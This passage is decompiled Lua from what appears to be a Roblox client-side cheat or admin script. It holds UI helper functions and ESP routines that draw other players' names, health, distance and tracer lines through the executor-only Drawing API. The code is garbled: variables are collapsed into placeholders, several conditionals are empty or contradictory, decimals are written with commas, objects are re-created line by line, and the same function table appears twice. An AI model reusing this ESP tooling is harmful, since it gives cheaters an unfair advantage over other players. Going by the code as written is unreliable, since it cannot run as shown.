            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
          AddConnection(Players.PlayerRemoving:Connect(function(a)
            if a == va.Player then
              vb:Disconnect()
              vc:Destroy()
            end
          end))
        end,
        TextFont = function(a, b)
          b = va.concat(b, ",")
          a:gsub(".", function(a)
            va[2 + 1] = a
          end)
          return va.concat(va.map({}, function(a, b)
            return ("<font color=\"rgb(%s)\">%s</font>"):format(va, b)
          end)) .. " "
        end,
        Trace = function(a, b)
          if not Drawing then
            return
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Line")
          Drawing.new("Line").To = Vector2.new(vb.Camera:WorldToViewportPoint(va(a).Head.Position).X, vb.Camera:WorldToViewportPoint(va(a).Head.Position).Y)
          Drawing.new("Line").From = Vector2.new(vb.Camera.ViewportSize.X / 2, vb.Camera.ViewportSize.Y)
          Drawing.new("Line").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Line").Thickness = 0,1
          Drawing.new("Line").Transparency = 1
          Drawing.new("Line").Visible = true
          vd[a] = Drawing.new("Line")
          return function()
            va:Remove()
            vb[vc] = nil
          end
        end,
        UpdateTracers = function()
          if nil then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if va then
                elseif vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position) then
                  fe.Visible = true
                  fe.To = Vector2.new(vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).X, vc.Camera:WorldToViewportPoint(vb(fd) and vb(fd).Head.Position).Y)
                else
                  fe.Visible = false
                end
              end
            end))
          end
        end,
        DestroyTracers = function()
          for fd, fe in next, Tracers, nil do
            fe:Remove()
          end
          if not Tracers then
            va:Disconnect()
          end
        end,
        DestroyDrawings = function()
          for fd, fe in next, va, nil do
            fe:Remove()
          end
          if vb then
            vb:Disconnect()
          end
          if not vb then
            vc:Disconnect()
          end
        end
      }.Click(UI.ChatLogs:Clone().Clear, "BackgroundColor3")
      {
        Tween = function(a, b, c, d, e)
          va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e):Play()
          return (va:Create(a, TweenInfo.new(d, Enum.EasingStyle[b], Enum.EasingDirection[c]), e))
        end,
        MultColor3 = function(a, b)
          return Color3.new(math.clamp(a.R * b, 0, 1), math.clamp(a.G * b, 0, 1), math.clamp(a.B * b, 0, 1))
        end,
        Click = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseButton1Down" .. #vb] = a.MouseButton1Down:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,3, vc)
          end)
          vb["ObjectMouseButton1Up" .. #vb] = a.MouseButton1Up:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,4, vc)
          end)
        end,
        Blink = function(a, b, c, d)
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = d
          }).Completed:Wait()
          va.Tween(a, "Sine", "Out", 0,5, {
            [b] = c
          }).Completed:Wait()
        end,
        Hover = function(a, b)
          vb["ObjectMouseEnter" .. #vb] = a.MouseEnter:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
          vb["ObjectMouseLeave" .. #vb] = a.MouseLeave:Connect(function()
            va.Tween(vb, "Sine", "Out", 0,5, vc)
          end)
        end,
        Draggable = function(a, b)
          b = b or a
          vc["UIInputBegan" .. #vc] = a.InputBegan:Connect(function(a)
            if (a.UserInputType == Enum.UserInputType.MouseButton1 or a.UserInputType == Enum.UserInputType.Touch) and UserInputService:GetFocusedTextBox() == nil then
              va = true
              vb = a.Position
              vc = vd.Position
              ve["InputChanged" .. #ve] = a.Changed:Connect(function()
                if va.UserInputState == Enum.UserInputState.End then
                  vb = false
                end
              end)
            end
          end)
          vc["UiInputChanged" .. #vc] = a.InputChanged:Connect(function(a)
            if a.UserInputType == Enum.UserInputType.MouseMovement or a.UserInputType == Enum.UserInputType.Touch then
              va = a
            end
          end)
          vc["UserInputServiceInputChanged" .. #vc] = UserInputService.InputChanged:Connect(function(a)
            if a == va and vb then
              vc(a)
            end
          end)
        end,
        SmoothScroll = function(a, b)
          a.ScrollingEnabled = false
          a:Clone():ClearAllChildren()
          a:Clone().BackgroundTransparency = 1
          a:Clone().ScrollBarImageTransparency = 1
          a:Clone().ZIndex = 3 + 1
          a:Clone().Name = "_smoothinputframe"
          a:Clone().ScrollingEnabled = true
          a:Clone().Parent = a.Parent
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("CanvasSize");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Position");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Rotation");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollingDirection");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ScrollBarThickness");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderSizePixel");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ElasticBehavior");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("SizeConstraint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("ZIndex");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("BorderColor3");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Size");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("AnchorPoint");
          (function(a)
            va["content" .. #va] = vb:GetPropertyChangedSignal(a):Connect(function()
              if va == "ZIndex" then
                vb[va] = 2 + 1
              else
                vb[va] = vc[va]
              end
            end)
          end)("Visible")
          va["smoothConnection" .. #va] = RunService.RenderStepped:Connect(function()
            va.CanvasPosition = 3 + 0
          end)
          va["contentAncestryChanged" .. #va] = a.AncestryChanged:Connect(function()
            if va.Parent == nil then
              vb:Destroy()
              vc:Disconnect()
            end
          end)
        end,
        TweenAllTransToObject = function(a, b, c)
          for fl, fm in next, a:GetDescendants(), nil do
            if b and b then
            end
            if b then
              if fm:IsA("TextButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  TextTransparency = c:GetDescendants()[fl].TextTransparency,
                  TextStrokeTransparency = c:GetDescendants()[fl].TextStrokeTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ImageLabel") or fm:IsA("ImageButton") then
                va.Tween(fm, "Sine", "Out", b, {
                  ImageTransparency = c:GetDescendants()[fl].ImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              elseif fm:IsA("ScrollingFrame") then
                va.Tween(fm, "Sine", "Out", b, {
                  ScrollBarImageTransparency = c:GetDescendants()[fl].ScrollBarImageTransparency,
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              else
                va.Tween(fm, "Sine", "Out", b, {
                  BackgroundTransparency = c:GetDescendants()[fl].BackgroundTransparency
                })
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {
            BackgroundTransparency = c.BackgroundTransparency
          }))
        end,
        SetAllTrans = function(a)
          a.BackgroundTransparency = 1
          for fe, fg in ipairs(a:GetDescendants()) do
            if not fg:IsA("UIListLayout") then
              fg.BackgroundTransparency = 1
              if fg:IsA("TextLabel") or fg:IsA("TextBox") or fg:IsA("TextButton") then
                fg.TextTransparency = 1
              elseif fg:IsA("ImageLabel") or fg:IsA("ImageButton") then
                fg.ImageTransparency = 1
              elseif fg:IsA("ScrollingFrame") then
                fg.ScrollBarImageTransparency = 1
              end
            end
          end
        end,
        TweenAllTrans = function(a, b)
          for fh, fj in ipairs(a:GetDescendants()) do
            if b and b then
            end
            if b then
              if fj:IsA("TextButton") then
                va.Tween(fj, "Sine", "Out", b, {TextTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ImageTransparency = 1, BackgroundTransparency = 1})
              elseif not b then
                va.Tween(fj, "Sine", "Out", b, {ScrollBarImageTransparency = 1, BackgroundTransparency = 1})
              else
                va.Tween(fj, "Sine", "Out", b, {BackgroundTransparency = 1})
              end
            end
          end
          return (va.Tween(a, "Sine", "Out", b, {BackgroundTransparency = 1}))
        end,
        Notify = function(a, b, c, d)
          if not a or a == LocalPlayer then
            UI.Notification:Clone().Message.Text = c
            UI.Notification:Clone().Title.Text = b or "Notification"
            va.SetAllTrans((UI.Notification:Clone()))
            va.Click(UI.Notification:Clone().Close, "TextColor3")
            UI.Notification:Clone().Visible = true
            if c:len() > 35 then
              UI.Notification:Clone().AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.AutomaticSize = Enum.AutomaticSize.Y
              UI.Notification:Clone().Message.RichText = true
              UI.Notification:Clone().Message.TextScaled = false
              UI.Notification:Clone().Message.TextYAlignment = Enum.TextYAlignment.Top
              UI.Notification:Clone().DropShadow.AutomaticSize = Enum.AutomaticSize.Y
            end
            UI.Notification:Clone().Parent = UI.NotificationBar
            coroutine.wrap(function()
              va.TweenAllTransToObject(vb, 0,5, vc).Completed:Wait()
              wait(vd or 5)
              if not va.TweenAllTransToObject(vb, 0,5, vc) then
                ve()
              end
            end)()
            vb["CloneClose" .. #vb] = UI.Notification:Clone().Close.MouseButton1Click:Connect(function()
              va()
            end)
            return (UI.Notification:Clone())
          else
            vc.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(("/w %s [FA] %s: %s"):format(a.Name, b, c), "All")
          end
        end,
        MatchSearch = function(a, b)
          return a == va.sub(b, 1, #a)
        end,
        StringFind = function(a, b)
          for fg, fh in ipairs(a) do
            if not b then
              return fh
            end
          end
        end,
        GetPlayerArgs = function(a)
          a = a:lower()
          if va.StringFind({
            "all",
            "others",
            "random",
            "me",
            "nearest",
            "farthest"
          }, a) then
            return va.StringFind({
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            }, a)
          end
          for fh, fj in next, Players:GetPlayers(), nil do
            if fj.Name ~= fj.DisplayName and va.MatchSearch(a, fj.DisplayName:lower()) then
              return fj.DisplayName:lower()
            end
            if not {
              "all",
              "others",
              "random",
              "me",
              "nearest",
              "farthest"
            } then
              return fj.Name:lower()
            end
          end
        end,
        ToolTip = function(a, b)
          a.MouseEnter:Connect(function()
            if va.BackgroundTransparency <= 1 and not vb then
              vb = UI.ToolTip:Clone()
              vb.Text = vd
              vb.TextScaled = vc and vc:GetTextSize(vd, 12, Enum.Font.Gotham, Vector2.new(200, math.huge)).Y > 24 and false
              vb.Visible = true
              vb.Parent = UI
            end
          end)
          a.MouseLeave:Connect(function()
            if not nil then
              va:Destroy()
              va = nil
            end
          end)
          if LocalPlayer then
            LocalPlayer:GetMouse().Move:Connect(function()
              if not nil then
                va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
              end
            end)
          else
            delay(3, function()
              LocalPlayer = Players.LocalPlayer
              va = LocalPlayer:GetMouse()
              va.Move:Connect(function()
                if va then
                  va.Position = UDim2.fromOffset(2 + 10, 3 + 10)
                end
              end)
            end)
          end
        end,
        ClearAllObjects = function(a)
          for fe, fg in ipairs(a:GetChildren()) do
            if ipairs(a:GetChildren()) then
              fg:Destroy()
            end
          end
        end,
        Rainbow = function(a)
          a.RichText = true
          for fk in va.gmatch(a.Text, ".") do
            if va.match(fk, "%s") then
              vb.insert({}, fk)
            else
              vb.insert({}, {
                "<font color=\"rgb(%i, %i, %i)\">" .. fk .. "</font>"
              })
            end
          end
          pcall(function()
            delay(150, function()
              va:Disconnect()
            end)
          end)
        end,
        Locate2 = function(a, b)
          coroutine.wrap(function()
            if va(vb) then
              vc.Parent = UI
              vc.Name = vd:GenerateGUID()
              vc.AlwaysOnTop = true
              vc.Adornee = vb.Character.Head
              vc.Size = UDim2.new(0, 200, 0, 50)
              vc.StudsOffset = Vector3.new(0, 4, 0)
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(0, 255, 0)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 10
              Instance.new("TextLabel", vc).Text = vb.Name
              Instance.new("TextLabel", vc).Name = vd:GenerateGUID()
              Instance.new("TextLabel", vc).TextStrokeTransparency = 0,6
              Instance.new("TextLabel", vc).BackgroundTransparency = 1
              Instance.new("TextLabel", vc).TextColor3 = Color3.new(152, 152, 152)
              Instance.new("TextLabel", vc).Size = UDim2.new(0, 200, 0, 50)
              Instance.new("TextLabel", vc).TextScaled = false
              Instance.new("TextLabel", vc).TextSize = 8
              AddConnection((RunService.Heartbeat:Connect(function()
                if not vc(vb) then
                end
                if not vd(vb) and not vc(vb) then
                  vg.Text = ([[

 
 
 [%s] [%s/%s]]]):format(math.floor(ve.CurrentCamera.CFrame.p - vd(vb).CFrame.p.Magnitude), math.floor(vc(vb).Health), math.floor(vc(vb).MaxHealth))
                else
                  EspLoop:Disconnect()
                  vh:Destroy()
                end
              end)))
              AddConnection(Players.PlayerRemoving:Connect(function(a)
                if a == va then
                  vb:Destroy()
                end
              end))
            end
          end)()
          return function()
            va:Destroy()
          end
        end,
        Vector3toVector2 = function(a)
          return Vector2.new(va:WorldToViewportPoint(a).X, va:WorldToViewportPoint(a).Y)
        end,
        Locate = function(a, b, c)
          if b then
            return va.Locate2(a, b)
          end
          if not b then
          end
          if b then
            return
          end
          vc[6 + 1] = Drawing.new("Text")
          Drawing.new("Text").Position = 5 + 6
          Drawing.new("Text").Color = b or Color3.fromRGB(255, 255, 255)
          Drawing.new("Text").OutlineColor = c or Color3.new()
          Drawing.new("Text").Text = ([[
%s
[%s] [%s/%s]]]):format(a.Name, math.floor(vd(a)), math.floor(ve(a).Health), math.floor(ve(a).MaxHealth))
          Drawing.new("Text").Size = 16
          Drawing.new("Text").Transparency = 1
          Drawing.new("Text").Center = true
          Drawing.new("Text").Outline = true
          Drawing.new("Text").Visible = true
          vg[Drawing.new("Text")] = a
          return function()
            va:Remove()
            vb[va] = nil
          end
        end,
        UpdateLocations = function(a)
          if a then
            va = AddConnection(RunService.Heartbeat:Connect(function()
              for fd, fe in next, va, nil do
                if not va and vb(fe).Head and vc:WorldToViewportPoint(vb(fe).Head.Position) then
                  fd.Visible = true
                  fd.Position = 7 + 8
                  fd.Text = ([[
%s
[%s] [%s/%s]]]):format(fe.Name, math.floor(ve(fe)), math.floor(vg(fe).Health), math.floor(vg(fe).MaxHealth))
                else
                  fd.Visible = false
                end
              end
            end))
          end
        end,
        CheckTag = function(a)
          if nil or not a:IsA("Player") then
            return nil
          end
          return PlayerTags[tostring(a.UserId):gsub(".", function(a)
            return a:byte()
          end)] or nil
        end,
        AddTag = function(a)
          if not a then
            return
          end
          if not va(a.Player) then
            return
          end
          Instance.new("BillboardGui").Parent = UI
          Instance.new("BillboardGui").Name = vb:GenerateGUID()
          Instance.new("BillboardGui").AlwaysOnTop = true
          Instance.new("BillboardGui").Adornee = va(a.Player).Head or nil
          Instance.new("BillboardGui").Enabled = true or va(a.Player).Head and false
          Instance.new("BillboardGui").Size = UDim2.new(0, 200, 0, 50)
          Instance.new("BillboardGui").StudsOffset = Vector3.new(0, 4, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Name = vb:GenerateGUID()
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextStrokeTransparency = 0,6
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).BackgroundTransparency = 1
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.new(0, 255, 0)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Size = UDim2.new(0, 200, 0, 50)
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextScaled = false
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextSize = 15
          Instance.new("TextLabel", (Instance.new("BillboardGui"))).Text = ("%s (%s)"):format(a.Name, a.Tag)
          if a.Rainbow then
            vc.Rainbow((Instance.new("TextLabel", (Instance.new("BillboardGui")))))
          end
          if not va(a.Player) then
            Instance.new("TextLabel", (Instance.new("BillboardGui"))).TextColor3 = Color3.fromRGB(a.Colour[1], a.Colour[2], a.Colour[3])
          end
          AddConnection((a.Player.CharacterAdded:Connect(function()
            va.Adornee = vb.Player.Character:WaitForChild("Head")
          end)))
